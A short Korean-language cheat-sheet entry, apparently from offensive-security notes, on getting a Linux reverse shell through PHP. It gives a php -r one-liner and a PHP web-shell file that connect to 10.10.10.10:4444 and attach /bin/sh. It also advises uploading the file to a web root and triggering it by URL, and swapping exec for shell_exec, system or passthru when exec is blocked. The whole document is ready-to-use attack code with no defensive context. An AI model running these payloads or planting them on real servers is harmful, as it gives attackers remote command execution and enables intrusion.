# linux php reverse shell

php CLI가 있을 때, 또는 PHP 웹셸에서 실행할 때.

```bash
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- `fsockopen`이 연 소켓은 FD 3으로 열린다.

## PHP 웹셸 파일 버전

```php
<?php
$sock = fsockopen("10.10.10.10", 4444);
proc_open("/bin/sh -i", [0=>$sock, 1=>$sock, 2=>$sock], $pipes);
?>
```

- 웹 루트에 올리고 URL로 한 번 치면 연결된다. 업로드는 [../web-shell/php_webshell.md](../web-shell/php_webshell.md).
- `exec`가 막혀 있으면 `shell_exec`, `system`, `passthru`로 교체한다.
